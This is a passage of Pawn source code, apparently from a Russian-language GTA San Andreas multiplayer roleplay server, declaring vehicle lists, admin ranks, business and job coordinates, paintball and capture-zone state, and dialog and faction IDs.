        {426},//Rolls-Royce Phantom
        {466},//BMW M5 F90
        {475},//Range Rover Vogue
        {480},//Porsche 911 Carrera S
        {482},//Mercedes-Benz G55
        {489},//BMW X5M F95
        {490},//Cadilac Escalade
        {494},//BMW M8 F92
        {495},//Porsche Cayenne
        {502},//Tesla Model S
        {503},//Ford Mustang
        {505},//Lamborghini Urus
        {506},//Ferrari 488 GTB
        {517},//Bentley Continental GT
        {533},//Audi R8
        {534},//Mercedes-Benz GLE63 Coupe
        {535},//BMW M4
        {541},//Lamborghini Aventador SVJ
        {543},//Buggati Chiron
        {549},//Mercedes-Benz S63C
		{559},//Nissan GT-R 35
		{560},//Porsche Panamera
		{566},//Mercedes-Benz GLS63 AMG
        {567},//Audi RS-6 Avant
        {573},//Mercedes-Benz 6x6 .
        {575},//BMW 740LI
        {579},//Mercedes-Benz G63
        {580},//Mercedes-Benz W221 S63
        {587},//Mercedes-Benz GT63s
        {588},//Audi Q7
		{600},//BMW 740 F02
		{602},//BMW Z4 M40 2019
		{603},//Bentley Mulliner
        {605}//Chevrolete Camaro
    },
    {
        {400},//BMW X5 e53
        {405},//INFINITI Q50
        {410},//Mitsubishi Lancer X
        {412},//MAZDA 3
        {419},//Subaru WRX STI
        {421},//Mercedes-Benz S600 W140
        {429},//Ford Focus
        {436},//BMW E38 740
        {438},//Mercedes-Benz E55 W210
        {445},//Lada Vesta
        {458},//Toyota Mark II
        {477},//Mazda RX-7
        {478},//Renault Megane
        {485},//Volkswagen Golf R
        {491},//BMW M3 E46
        {507},//BMW M5 E28
        {516},//Volkswagen Polo
        {526},//Audi S4
        {527},//BMW M5 E39
        {529},//BMW M5 E60 .
        {536},//Skoda Superb
        {546},//BMW E34
        {547},//Audi 80
        {550},//Jeep Grand Cherokee
        {551},//Tayota Land Cruiser 200
        {554},//Ford Raptor
        {562},//Nissan Skyline R34
        {589},//Volkswagen Jetta
        {0},
        {0},
        {0},
        {0},
        {0},
        {0},
        {0},
        {0},
        {0}
    },
    {
    	{424},// ОКА
        {467},// Ваз 2101
        {439},// Ваз 2106
        {404},// Ваз 2107
        {545},// Ваз21099
        {479},// Ваз 2110
        {442},// Ваз 2112
        {401},// Ваз 2113
        {492},// Ваз 2114
        {496},//Волга
        {508},//Буханка
        {500},//Патриот
        {474},//Гранта
        {540},//Приора
        {565},//Приора Хэтчбек
        {542},//Нива .
        {555},//Гольф
        {0},
        {0},
        {0},
        {0},
        {0},
        {0},
        {0},
        {0},
        {0},
        {0},
        {0},
        {0},
        {0},
        {0},
        {0},
        {0},
        {0},
        {0},
        {0},
        {0}
     }
};
enum
	E_PLAYER_SETTINGS_STRUCT
{
	PS_FAM_CHAT = 0,
	PS_FAM_CHAT_COLOR,
	PS_ORG_CHAT,
	PS_ORG_CHAT_COLOR,
	PS_NAMES,
	PS_ADM_LOGS,
	PS_ADM_LOGS_COLOR,
	PS_ID_PLAYERS,
	PS_CASE,
};

new g_player_settings[MAX_PLAYERS][E_PLAYER_SETTINGS_STRUCT];

new
	g_player_setting_default_values[E_PLAYER_SETTINGS_STRUCT] =
{
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	0,
};

#define GetSettingPlayerData(%0,%1)		g_player_settings[%0][%1]
#define SetSettingPlayerData(%0,%1,%2)	g_player_settings[%0][%1] = %2
#define ClearSettingPlayer(%0)			g_player_settings[%0] = g_player_setting_default_values

enum
	E_SETTING_STRUCT
{
	S_NAME[32],
	S_COLOR
};

new settings_names[][E_SETTING_STRUCT] =
{
	"Чат семьи", 0,
	"Цвет чата семьи", 1,
	"Чат организации", 0,
	"Цвет чата организации", 1,
	"Ники игроков", 0,
	"Действия администраторов", 0,
	"Цвет действий администраторов", 1,
	"ID игроков в чате", 0,
	"Чемодан в руке", 0
};

new admin_rank_name[][] =
{
	{"Агент Поддержки"},
	{"Младший Модератор"},
	{"Старший Модератор"},
	{"Администратор"},
	{"Зам Главного Адмнистратора"},
	{"Главный Администратор"},
	{"Спец Администратор"},
	{"Руководитель"}
};

#define GetPlayerAdminName(%0) admin_rank_name[PI[%0][pAdmin]]

#define REALTOR_TYPE_NONE	(0)
#define REALTOR_TYPE_HOUSE	(1) // дом
#define REALTOR_TYPE_BIZ	(2) // биз
#define REALTOR_TYPE_GARAGE	(3) // гараж

enum
	E_BIZ_INFO_STRUCT
{
	Float: BI_EXIT_X,
	Float: BI_EXIT_Y,
	Float: BI_EXIT_Z,
	Float: BI_EXIT_A,
	Float: BI_MENU_X,
	Float: BI_MENU_Y,
	Float: BI_MENU_Z
};
new g_business_info[][E_BIZ_INFO_STRUCT] =
{
	{353.2370, 493.5753, 999.3438, 360.0, 357.5614,497.4608,999.3281},		// 24/7
	{0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},										// азс
	{664.2852,497.2179,305.1310, 268.2926, 660.5941,492.8943,305.1310},	// закусочная
	{-1499.9595,-296.6198,1762.7900, 270.0, -1498.5411, -300.3899, 1762.5275},	// бар
	{-187.3197, 880.8048, 2612.6399, 180.0, -186.4855, 856.6979, 2612.4531},	// клуб
	{540.4188, -844.3546, 1002.0000, 180.0, 541.7650,-851.2516,1002.0000},		// магазин оружия
	{0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0}, 										// сто
	{-913.9792, 1202.0702, 1002.0200, 360.0, -913.6543,1211.7676,1002.0200},	// магазин одежды
	{1690.1354,2068.0659,-7.8350,88.4000, 1676.3431,2049.1152,-7.3728},		// казино
	{637.1538,-1129.7153,1081.4840, 270.0, 641.7103,-1130.5568,1081.4840},		// транспортная компания
	{2214.1970,-410.0685,2522.0066, 180.0, 2230.3430,-409.9550,2522.0066},		// автосалон (легковые)
	{614.7014,-155.2297,1014.1600, 180.0, 613.9857,-169.6389,1014.1600}		// автосалон (грузовики)
};

#define GetAdminRank(%0) admin_rank[PI[%0][pAdmin]]

new admin_rank[][] =
{
	{"Агент Поддержки"},
	{"Мл. Администратор"},
	{"Администратор"},
	{"Ст. Администратор"},
	{"Гл. Администратор"},
	{"Руководитель"},
	{"Разработчик"}
};

//new AreaDiceMoney[4];

static
	Float: area_dice_money[][] =
	{
		{1686.4070,2061.7310,-6.9444,1.9584},
		{1686.3739,2074.9468,-6.9444,1.1516},
		{1679.7378,2074.9827,-6.9444,268.6598},
		{1679.7053,2061.8179,-6.9444,181.0458}
	};

new dps_barrier;
new dps_barrier_status = 0;

//new mayor_barrier;
new mayor_barrier_status = 0;

new army_barrier,
	army_barrier2;
new army_barrier_status = 0,
	army_barrier_status2 = 0;

new fbi_barrier;
new fbi_barrier_status = 0;

new actors[12];
new scooter[4];

enum
	E_PAINTBALL_INFO
{
	PB_STATUS,
	PB_TEAM_KILLS[2],
	PB_TEAM_DEATHS[2],
	PB_VOTE[2],
	PB_MAP,
};

new g_paintball_info[E_PAINTBALL_INFO];

new
	g_paintball_default_values[E_PAINTBALL_INFO] =
{
	0,
	{0, 0},
	{0, 0},
	{0, 0},
	0
};

new g_paintball_map_name[][] = {"Детдом", "Полигон"};

new Text: paintball_td[20];

new bplayer;

static Float: paintball_spawn[2][2][2][4] =
{
	{
		{
			{532.2366, -94.5463, 1446.7612, 90.0},
			{504.6819, -94.9687, 1446.7612, 270.0}
		},
		{
			{538.6276,-136.9373,1454.1885, 90.0},
			{512.7760,-136.7678,1454.1885, 360.0}
		}
	},
	{
		{
			{-170.7988,2642.3728,1001.5000,168.3921},
			{-165.2210,2649.5298,1001.5000,206.3059}
		},
		{
			{-231.7015,2589.6926,1001.5000,298.4266},
			{-219.2839,2588.3809,1001.5000,296.5466}
		}
	}
};

new g_player_car[MAX_PLAYERS] = {INVALID_VEHICLE_ID, ...};

new CaptureZone;
new CaptureArea;

enum
	E_CAPTURE_STRUCT
{
	bool: C_STATUS,
	C_BIZ_ID,
	C_TEAM_ATTACK,
	C_TEAM_PROTECT,
	C_TEAM_ATTACK_KILLS,
	C_TEAM_PROTECT_KILLS,
	C_TIME,
};
new g_capture[E_CAPTURE_STRUCT];

new
	g_capture_default_values[E_CAPTURE_STRUCT] =
{
	false,
	-1,
	-1,
	-1,
	0,
	0,
	0
};

#define GetCaptureData(%0)		g_capture[%0]
#define SetCaptureData(%0,%1)	g_capture[%0] = %1
#define ClearCaptureData		g_capture = g_capture_default_values

new Text:capture_td[19];


const MAX_PLAYER_OWNABLE_CARS = 4;

static
	Float: coord_spawn_scooters[][4] =
	{
		{-449.5981,956.7123,11.4910,178.1593},
		{-452.0611,956.8336,11.4898,176.6633},
		{-454.8378,956.7620,11.4901,176.4111},
		{-457.4735,956.7112,11.4893,177.4731}
	};

static
	Float: coord_spawn_scooters_bat[][4] =
	{
		{1900.7592,2063.8315,15.2585,356.6297},
		{1901.9414,2063.8242,15.2865,1.7174},
		{1903.1149,2063.8213,15.2685,8.0503},
		{1904.6223,2063.8083,15.2744,345.9653}

	};

static
	Float: coord_spawn_scooters_yujz[][4] =
	{
		{2510.3108,-2141.9097,21.5016,178.6916},
		{2508.8792,-2142.0359,21.4890,182.9960},
		{2507.5930,-2142.1550,21.4575,188.6372},
		{2506.0366,-2142.1096,21.4734,186.8725}

	};

static
	Float: coord_spawn_scooters_sounth[][4] =
	{
		{785.7698,514.4687,11.5514,328.9095},
		{783.2609,516.0207,11.5514,329.8801},
		{780.8890,517.4933,11.5509,329.4389},
		{778.4417,518.7274,11.5516,330.1592}

	};

static
	Float: coord_spawn_scooters_miner[][4] =
	{
		{2332.6956,1726.5538,1.3031},
		{2329.9968,1726.3124,1.3054},
		{2327.3760,1726.0771,1.3051},
		{2324.8423,1725.9774,1.3045}

	};

const MAX_ENTRANCES = 1000;

enum
	E_ENTRANCE_STRUCT
{
	E_SQL_ID,
	Float: POS_X,
	Float: POS_Y,
	Float: POS_Z,
	Float: EXIT_POS_X,
	Float: EXIT_POS_Y,
	Float: EXIT_POS_Z,
	Float: EXIT_ANGLE,
	E_PICKUP,
	E_MAP_ICON,
	E_AREA_ENTER,
	E_PRICE_ROOM
};

new g_entrance[MAX_ENTRANCES][E_ENTRANCE_STRUCT];
new TOTALENTRANCE;

new AreaEntraceMenu;
new AreaEntraceExit;
new AreaRoomExit;

#define GetEntranceData(%0,%1)		g_entrance[%0][%1]
#define SetEntranceData(%0,%1,%2)	g_entrance[%0][%1] = %2

const MAX_ROOMS = 11;

enum
	E_ROOM_STRUCT
{
	ER_SQL_ID,
	ER_OWNER[MAX_PLAYER_NAME],
	ER_PAY,
	bool: ER_LOCK
};

new g_rooms[MAX_ENTRANCES][MAX_ROOMS][E_ROOM_STRUCT];
new TOTALROOMS;

#define GetRoomData(%0,%1,%2)		g_rooms[%0][%1][%2]
#define SetRoomData(%0,%1,%2,%3)	g_rooms[%0][%1][%2] = %3

static
	Float: coord_rooms[][] =
	{
		{1660.9041,493.9930,302.6935},
		{1658.7148,493.9925,302.7004},
		{1656.5061,493.9931,302.7004},
		{1663.0757,493.9928,306.7326},
		{1660.8954,493.9925,306.7404},
		{1658.7368,493.9930,306.7326},
		{1656.5256,493.9953,306.7326},
		{1663.0978,493.9930,310.7492},
		{1660.8839,493.9932,310.7560},
		{1658.7028,493.9935,310.7492},
		{1656.5208,493.9935,310.7492}
	};

new g_area_rooms[sizeof coord_rooms];

enum
	E_COINS_LIST_STRUCT
{
	CL_ID,
	CL_NAME[32],
	CL_PRICE
};

new TruckerCar[MAX_PLAYERS];
new TruckerGruz[MAX_PLAYERS];

static
	Float: coord_spawn_trailers[][4] =
	{
		{-949.6700,1234.0858,12.2043,274.8621},
		{-949.2325,1229.6604,12.2038,273.5044},
		{-948.6766,1224.6110,12.2092,274.8254},
		{-948.1995,1219.7521,12.2110,274.0456}
	};

static
	Float: coord_spawn_truck[][4] =
	{
		{-931.4746,1201.5107,11.4213,275.8380},
		{-931.0013,1196.4485,11.4216,274.8428},
		{-930.2484,1190.4126,11.4213,276.4703},
		{-929.8337,1184.9595,11.4211,275.4106}
	};

new g_coins_list[][E_COINS_LIST_STRUCT] =
{
	{444, "Монстр", 300},
	{603, "Bentley", 200},
	{508, "Лимузин", 300},
	{605, "Lamborghini", 200}
};

enum
	E_SKILLS_STRUCT
{
	S_LICS[4],
	S_GUN[8],
	S_T_FLIGHTS,
	S_T_COUNT,
	S_TAXI_CALLS,
	S_M_FIX,
	S_B_FLIGHTS,
	S_FERM_LVL,
	S_FERM_COUNT
};

new g_player_skills[MAX_PLAYERS][E_SKILLS_STRUCT];

#define GetPlayerSkillData(%0,%1)		g_player_skills[%0][%1]
#define SetPlayerSkillData(%0,%1,%2)	g_player_skills[%0][%1] = %2

static
	Float: coord_checkpoint_miner[][] = // руда шахты
	{
		{1673.0930,1455.0308,453.0168},
		{1667.9983,1458.0876,453.8296},
		{1659.1860,1452.9204,454.1940},
		{1663.1327,1439.3501,453.5524},
		{1669.5713,1435.2885,453.8144},
		{1678.3506,1470.0450,455.5039},
		{1689.4640,1465.3463,453.5781},
		{1685.5046,1443.3165,450.8275}
	};

static
	Float: coord_checkpoint_les[][] = // лес лесопилки
	{
		{876.634155, 496.188629, 12.7175},
	    {882.514221, 489.598571, 12.7175},
	    {870.965087, 481.265289, 12.7175},
	  	{873.699157, 474.002349, 12.7175},
	  	{880.718688, 468.086120, 12.7175},
	  	{872.184631, 466.289550, 12.7175},
	  	{864.510620, 463.272277, 12.7175},
	  	{864.750915, 479.531494, 12.7175}
	};

enum
{
	JOB_NONE = 0,
	// --------------
	JOB_MINER = 1,
	JOB_LOGGER,
	JOB_FARMER,
	JOB_GUN_COLLECTOR,
	JOB_GRUZ_WOOD,
};

enum
	E_FERM_STRUCT
{
	F_OWNER[MAX_PLAYER_NAME],
	F_SUB[MAX_PLAYER_NAME],
	F_COST,
	F_BANK,
	F_PAY,
	F_LOCK,
	F_AMBAR,
	F_PAYSENO,
	F_PAYCOMB,
	F_PAYTRAK,
	F_PAYTRUC,
	F_PROFIT,
	F_VISITORS,
	Text3D: F_LABEL,
	Text3D: F_SKLAD
};

new g_ferm_info[E_FERM_STRUCT];

#define GetFermData(%0)		g_ferm_info[%0]
#define SetFermData(%0,%1)	g_ferm_info[%0] = %1

new AreaFerm;

static
	Float: coord_checkpoint_farmer[][] =
	{
		{-789.6034,-1102.9547,46.0881},
		{-783.6312,-1106.8877,45.5671},
		{-769.8492,-1113.2609,45.4493},
		{-757.9800,-1118.3505,45.2818},
		{-744.2134,-1124.1694,45.0358},
		{-731.6369,-1129.9133,44.7533},
		{-718.7986,-1135.5291,44.4273},
		{-706.2561,-1141.0975,44.0854},
		{-788.6008,-1097.9435,46.0740},
		{-785.8537,-1091.6414,46.0715},
		{-781.9836,-1083.3026,46.1093},
		{-778.0812,-1074.8706,46.1593},
		{-769.5004,-1078.8682,45.7252},
		{-773.0945,-1088.3997,45.5919},
		{-764.1803,-1092.8649,46.0024},
		{-748.9000,-1093.6327,45.8275},
		{-752.6293,-1106.0537,45.5479},
		{-735.1877,-1096.1595,45.6760},
		{-720.4929,-1100.8696,45.1981},
		{-744.4592,-1093.2594,45.3084},
		{-726.7393,-1096.9111,45.3835},
		{-711.9051,-1103.6091,45.2661},
		{-707.5474,-1092.4854,45.2519},
		{-721.1819,-1086.2446,45.5165},
		{-735.1284,-1080.0187,45.6964}
	};

static
	Float: coord_checkpoint_farmer_unload[][] =
	{
		{-794.8856,-1117.6289,45.3736}, //зерно на ферме
		{-795.7029,-1124.9570,45.0737}
	};

new AreaFarmer;

new carshot[MAX_PLAYERS][3];

static
	Float: coord_checkpoint_gun_collector[][] =
	{
		{620.5201,828.1838,12.4434},
		{617.3022,828.1841,12.4434},
		{614.3439,828.1840,12.4434},
		{610.9886,828.1833,12.4434},
		{607.8609,828.1787,12.4434},
		{607.8198,816.2497,12.4434},
		{611.0919,816.2515,12.4434},
		{614.3017,816.2497,12.4434},
		{617.3059,816.2497,12.4434},
		{620.4861,816.2497,12.4434}
	};


const MAX_BOTTLES = 57;

new g_bottles[MAX_PLAYERS][MAX_BOTTLES];
new g_bottles_object[MAX_PLAYERS][MAX_BOTTLES];


static
	Float: coord_bottles_pickup[][] =
	{
		{2739.1599,-2442.3630,21.8921},
		{2681.7947,-2399.3621,21.8921},
		{2760.2234,-2396.4658,21.9269},
		{2756.1411,-2210.4817,17.9140},
		{2754.6333,-2177.3677,21.9503},
		{2640.7156,-2216.7820,22.0130},
		{2640.9346,-2286.6287,21.9962},
		{2640.8081,-2414.5369,22.0085},
		{2548.9885,-2622.4646,22.0041},
		{2506.0154,-2592.4866,21.9806},
		{2537.1321,-2475.0601,22.0021},
		{2542.5840,-2474.9670,22.0047},
		{2549.8225,-2206.0024,21.9575},
		{2559.8071,-2118.1985,22.7428},
		{2561.4985,-2117.0464,22.7427},
		{2554.9585,-2001.3494,22.0109},
		{2509.4028,-2119.1101,23.4558},
		{2342.2129,-2633.0107,22.0145},
		{2338.7029,-2628.8945,22.0196},
		{2263.8108,-2554.6018,21.9780},
		{1983.7893,-2647.5447,11.2629},
		{2220.6165,-2473.5342,20.5261},
		{2268.6345,-2473.6526,20.5261},
		{2326.9265,-2535.7429,21.7855},
		{2405.7595,-2475.9741,21.9417},
		{2305.7209,-2386.4302,21.9855},
		{2425.4980,-2223.4341,21.9721},
		{2438.2893,-2131.5842,21.9779},
		{2444.3713,-2000.3293,21.9779},
		{2401.3870,-2025.8676,21.9779},
		{2416.1384,-1979.7378,22.0043},
		{2446.1013,-1936.4523,22.0043},
		{2363.5583,-2059.4663,21.8054},
		{2446.5107,-1786.3903,21.8506},
		{2447.2949,-1791.5297,21.8556},
		{2414.6521,-1723.9897,21.8594},
		{2375.8828,-1720.7775,21.8594},
		{2140.5605,-1793.2712,19.9157},
		{2133.7617,-1964.3358,19.0781},
		{1966.7195,-1943.1189,25.1389},
		{1937.4427,-1902.6803,25.1389},
		{1921.9087,-1909.4518,32.0013},
		{1929.8298,-1922.9698,40.8107},
		{1912.5226,-2214.6833,11.2510},
		{1744.8616,-2329.7385,11.0010},
		{1745.0085,-2364.4670,8.2991},
		{1785.0630,-2414.4377,11.0010},
		{1824.0414,-2524.0803,8.2991},
		{2065.9009,-2295.9031,21.9430},
		{2102.0205,-2408.3457,21.9254},
		{2158.8928,-2392.5918,21.9430},
		{2309.2827,-2135.3625,21.9688},
		{2351.1001,-1959.2251,21.9760},
		{2326.3735,-1927.5745,22.0800},
		{2388.4551,-1832.3447,21.8616},
		{2264.3806,-1846.9819,21.9708},
		{2201.8118,-1851.5927,20.9552}
	};


new Text: sto_td_global[28];
new PlayerText: sto_td_player[3][MAX_PLAYERS];

main(){}
//-------------------------[ Максимальное количество для создания ]-------------
#define MAX_FRACTIONS         26
#define MAX_RANGS             17
#define MAX_ADVERTS           16
#define MAX_VCARS             250
#define MAX_BIZZ              300
#define MAX_ATM               300
#define MAX_HOUSES            1000
#define MAX_GANGS             20
#define MAX_RADARS            100
#define MAX_SLOT              17
#define MAX_INVENTORY_SLOTS   75
#define MAX_LIST              17
#define MAX_ITEM              245
#define MAX_DROP              1001
#define MAX_GARAGES           1000
//-------------------------------[Защита от UDP флуда]--------------------------
//#define MAX_MESSAGES   1500  // - Максимальное количество сообщений отсылаемое игроком за 5 секунд
//------------------------------------------------------------------------------
#define SETTINGS_COUNT        6
#define SMILE_COUNT           5
//------------------------------------------------------------------------------
#define SHOP_OBJECTS          11
#define EAT_OBJECTS           4
#define BAR_OBJECTS           7
#define GUN_OBJECTS           9
//------------------------------------------------------------------------------
#define MAX_SPEED             150
//------------------------------------------------------------------------------
#define TRUCK_LEVEL_2 		  (30000)
#define TRUCK_LOAD_1 		  (5000)
#define TRUCK_LOAD_2 		  (7000)
//------------------------------------------------------------------------------
#define PHONE_PRICE           (100)
#define LSNEWS_NUMBER 		  (555)
#define SFNEWS_NUMBER 		  (666)
#define LVNEWS_NUMBER 		  (777)
//------------------------------------------------------------------------------
#define WEAPON_RM 			  (1)
#define WEAPON_LCN 			  (2)
#define WEAPON_YAKUZA 		  (8)
#define WEAPON_NEWS 		  (43)
#define WEAPON_GAND 		  (5)
//------------------------------------------------------------------------------
#define NONE_3D_TEXT 		  (Text3D:-1)
//------------------------------------------------------------------------------
#define SPECIAL_ACTION_PISS   (68)
//------------------------------------------------------------------------------
#define ADM_NONE 			  (0)
#define ADM_MODER 			  (1)
#define ADM_SUPER_MODER 	  (2)
#define ADM_ADMIN       	  (3)
#define ADM_SUPER_ADMIN 	  (4)
#define ADM_GRAND_ADMIN 	  (5)
#define ADM_GRAND			  (6)
//------------------------------------------------------------------------------
#define AMMO_PISTOL 		  (20)
#define AMMO_SDPISTOL 		  (20)
#define AMMO_DEAGLE 		  (28)
#define AMMO_SHOTGUN 		  (40)
#define AMMO_MICROUZI		  (100)
#define AMMO_MP5 			  (100)
#define AMMO_AK47 			  (90)
#define AMMO_M4A1 			  (90)
//------------------------------------------------------------------------------
#define AMMO_PISTOL_VIP	      (10)
#define AMMO_SDPISTOL_VIP     (10)
#define AMMO_DEAGLE_VIP       (14)
#define AMMO_SHOTGUN_VIP      (20)
#define AMMO_MICROUZI_VIP     (50)
#define AMMO_MP5_VIP          (50)
#define AMMO_AK47_VIP         (45)
#define AMMO_M4A1_VIP         (45)
//------------------------------------------------------------------------------
#define MOVE_SPEED            100.0
#define ACCEL_RATE            0.03
//------------------------------------------------------------------------------
#define CAMERA_MODE_NONE      0
#define CAMERA_MODE_FLY       1
//--------------------------CEF----------------------------------------------
#define CEF_INTERFACE_BROWSER_ID 52
new bool:g_CefLoaded[MAX_PLAYERS];
new bool:g_HudVisible[MAX_PLAYERS];
//------------------------------------------------------------------------------
#define MOVE_FORWARD          1
#define MOVE_BACK             2
#define MOVE_LEFT             3
#define MOVE_RIGHT            4
#define MOVE_FORWARD_LEFT     5
#define MOVE_FORWARD_RIGHT    6
#define MOVE_BACK_LEFT        7
#define MOVE_BACK_RIGHT       8
enum MYSQL_SETTINGS
{
	DOOME_HOST,
	DOOME_USERNAME,
	DOOME_PASSWORD,
	DOOME_DATABASE
}
new MySQLSettings[MYSQL_SETTINGS][30];
//------------------------------[ ID Диалогов ]---------------------------------
enum
{
    D_NULL = 0,
	D_REGISTER = 1,
	D_LOGIN = 2,
	D_ERRORPAS  = 3,
    D_SEX =	4,
    D_MAINMENU = 5,
    D_COMMANDSERVER = 6,
    D_UCPADMIN = 7,
    D_UCPADMIN2 = 8,
    D_ADMIN = 10,
    D_ADDNED = 11,
    D_INVITEFRAC = 18,
    D_JOINHOUSE = 24,
    D_SELLHOUSE = 29,
    D_JOINCARS = 35,
    D_GPS = 46,
    D_WEATHER = 47,
    D_FRACMENU = 49,
    D_ATM = 62,
    D_NMENU = 77,
    D_HOME = 101,
    D_HEAL = 106,
    D_JOB = 131,
    D_DONATE = 200,
    D_CTO = 400,
    D_CAR = 600,
	D_SETSPAWN = 1000,
    D_BUYFISHKI = 1200,
    D_SERVICE = 1400,
    D_ARMOURY = 1600,
	D_STOPLOAD = 1800,
    D_RADAR = 2000,
	D_INVENT = 2200,
	D_PASS = 2400,
	D_POLMENU = 2600,
	D_MAIL = 3000,
	D_ALOGIN = 3200,
	D_TEMPLEADER = 3400,
	D_LEADERSKIN = 3600,
	D_PHONE = 3800,
	D_GANG = 4000,
	D_MAFIA = 4200,
	D_BREAK = 4400,
	D_COMMAND_SHOW = 4600,
	D_HOMEULUCH = 4800,
	D_BUYSIM = 5000,
    D_LIC = 5200,
	D_APANEL = 5400,
	D_VEHNUMBER = 5600,
	D_UNIVER = 5800,
	D_LEAVE = 6000,
	ArendTruckerDialog = 722,
	D_CANCELRENT = 6400,
	D_ASHTEST = 6600,
	D_AGE = 6800,
	D_INVITESKIN = 7000,
 	D_LPANEL = 7500,
 	D_PODEZD = 8050,
	D_PROMO = 15000,
	DIALOG_CUPBOARD = 18000,
	DIALOG_PUT_CUPBOARD_MONEY,
	DIALOG_TAKE_CUPBOARD_MONEY,
	DIALOG_PUT_CUPBOARD_HDRUGS,
	DIALOG_TAKE_CUPBOARD_HDRUGS,
	DIALOG_PUT_CUPBOARD_PATRONS,
	DIALOG_TAKE_CUPBOARD_PATRONS,
	D_FIXCAR,
	D_FIXCAR_1,
	D_FINDCAR,
	D_ARMYGUN,
	DEMORGAN,
	D_REMOVEADMIN,
	D_REMOVEADMIN1,
	D_REMOVELEADER,
	D_REMOVELEADER1,
	D_SET_DEVELOPER,
	DIALOG_BUY_VIP_NUMBER,
	DIALOG_CREDIT,
	DIALOG_CREDIT_TAKE,
	DIALOG_AREND_BALL,
	DIALOG_SELL_CAR,
	DIALOG_SELL_COPTER,
	DIALOG_ROUTE_BUS,
	DIALOG_INTERACTION_MONEY,
	DIALOG_INTERACTION_SELL_CAR,
	DIALOG_INTERACTION_SELL_BIZ,
	DIALOG_GARAGE_CREATE,
	DIALOG_GARAGE_MENU,
	DIALOG_GARAGE_BUY,
	DIALOG_BANK_MENU,
	DIALOG_BANK_ACCOUNTS,
	DIALOG_BANK_ACCOUNT_LOGIN,
	DIALOG_BANK_ACCOUNT_OPERATION,
	DIALOG_BANK_ACCOUNT_TAKE_MONEY,
	DIALOG_BANK_ACCOUNT_PUT_MONEY,
	DIALOG_BANK_ACCOUNT_TRANSFER,
	DIALOG_BANK_ACCOUNT_CHANGE_NAME,
	DIALOG_BANK_ACCOUNT_CHANGE_PIN,
	DIALOG_BANK_CREATE_ACCOUNT,
	DIALOG_BANK_MAIN,
	DIALOG_BANK_SELECT_SUM,
	DIALOG_BANK_SELECT_SUM_COMPANY,
	DIALOG_BANK_PHONE_BALANCE,
	DIALOG_BANK_TRANSFER,
	DIALOG_FAMILY,
	DIALOG_FAMILY_CREATE,
	DIALOG_FAMILY_SHOW_ALL,
	DIALOG_FAMILY_SET_SPAWN,
	DIALOG_FAMILY_ORDER_PROD,
	DIALOG_FAMILY_STORE,
	DIALOG_FAMILY_STORE_USE,
	DIALOG_FAMILY_BAR,
	DIALOG_PLAYER_SETTINGS,
	DIALOG_REALTOR_MENU,
	DIALOG_REALTOR_MENU_HOUSE,
	DIALOG_REALTOR_MENU_BIZ,
	DIALOG_REALTOR_MENU_GARAGE,
	DIALOG_REALTOR_INFO,
	DIALOG_REALTOR_INFO_HOUSE,
	DIALOG_REALTOR_HOUSE_PHOTO,
	DIALOG_REALTOR_INFO_BIZ,
	DIALOG_REALTOR_BIZ_PHOTO,
	DIALOG_REALTOR_INFO_GARAGE,
	DIALOG_REALTOR_GARAGE_PHOTO,
	DIALOG_AHELP,
	DIALOG_PAY_FINES,
	DIALOG_PAY_FINES_ANS,
	DIALOG_PAY_FINES_ALL,
	DIALOG_TOW_CAR,
	DIALOG_PARKING_FINE,
	DIALOG_FIND_CAR,
	DIALOG_ORDERS,
	DIALOG_LOAD_PROD,
	DIALOG_AREND_SCOOTER,
	DIALOG_DELIVERY_BOTTLE,
	DIALOG_PAY_HOUSE,
	DIALOG_PAY_BUSINESS,
	DIALOG_ENTRACE_MENU,
	DIALOG_CREATE_ENTRANCE,
	DIALOG_ENTRACE_REG,
	DIALOG_ROOM_ENTER,
	DIALOG_MENU_LODGER,
	DIALOG_PAY_ROOM,
	DIALOG_EVICTION_ROOM,
	DIALOG_COINS_LIST,
	DIALOG_PAINTBALL_SELECT_MAP,
	DIALOG_LISTENING,
	DIALOG_END_JOB,
	DIALOG_GPS_PLACES,
	DIALOG_START_JOB_MINER,
	DIALOG_START_JOB_LOGGER,
	DIALOG_START_JOB_FARMER,
	DIALOG_END_JOB_FARMER,
	DIALOG_START_JOB_GUN_COLLECTOR,
	DIALOG_FERM_MENU,
	DIALOG_FERM_MENU_ZP,
	DIALOG_FERM_SELL,
	DIALOG_FERM_SUB_LEAVE,
	DIALOG_FERM_TAKE_MONEY,
	DIALOG_FERM_GIVE_MONEY,
	DIALOG_STO_CHANGE_COLOR,
	D_AUTOSALON,
	DIALOG_PLAYER_MENU,
	D_BUY_LICENSES = D_AUTOSALON + 15,
	DLG_ADM_BIZZ_MENU,
	DLG_ADM_BIZZ_MENU_1,
	DLG_ADM_BIZZ_MENU_2,
	DLG_ADM_BIZZ_MENU_3,
	DLG_ADM_BIZZ_MENU_4,
	DLG_ADM_BIZZ_MENU_5,
	DLG_BOTTLE,
	DIALOG_GOOGLE,
	DIALOG_GOOGLE_SET_REG,
	DIALOG_GOOGLE_SET,
	DIALOG_GOOGLE_SET_CHECK,
	DIALOG_GOOGLE_CHECK,
	D_BUYNUMBER,
	DIALOG_AUTOSCHOOL_CAR,
	DIALOG_GRUZ,
 	DIALOG_SENO_ZP,
 	DIALOG_COMB_ZP,
 	DIALOG_TRUK_ZP,
 	DIALOG_TRAC_ZP,
	D_ALLFULLACCESS,

	D_BLACKLIST = (DIALOG_GOOGLE_CHECK+6), // занято до D_BLACKLIST+5. Начинать с BLACKLIST+6

};

new g_arend_ball_object;
new bool: g_arend_ball_status = false;


//-----------------------------[ ID работ ]-------------------------------------
#define JOB_BUS           				(1)
#define JOB_TAXI          				(2)
#define JOB_MECHANIC      				(5)
#define JOB_TRUCK      					(6)
//----------------------------[ ID фракций ]------------------------------------
#define TEAM_MERIA					    (1) //Егор
#define	TEAM_POLICIA	  				(2)
#define	TEAM_POLICIA2					(3)
#define	TEAM_FBI						(4)
#define	TEAM_BOLNICA					(5)
#define	TEAM_AUTOSCHOOL					(6)
#define	TEAM_GROOVE         			(7)
#define	TEAM_BALLAS        				(8)
#define	TEAM_RIFA          				(9)
#define	TEAM_OPGTEST2       			(10)
#define TEAM_VAGOS         				(11)
#define TEAM_ARMIYA 					(12)
// Свободный слот для организации (14)
#define TEAM_OPG1 						(15)
#define TEAM_RSM						(16)
#define TEAM_YAK    					(17)
#define TEAM_SMI 						(18)
#define TEAM_SFNEWS                     (19)
#define TEAM_LVNEWS                     (20)
#define TEAM_SWAT 	    				(21)
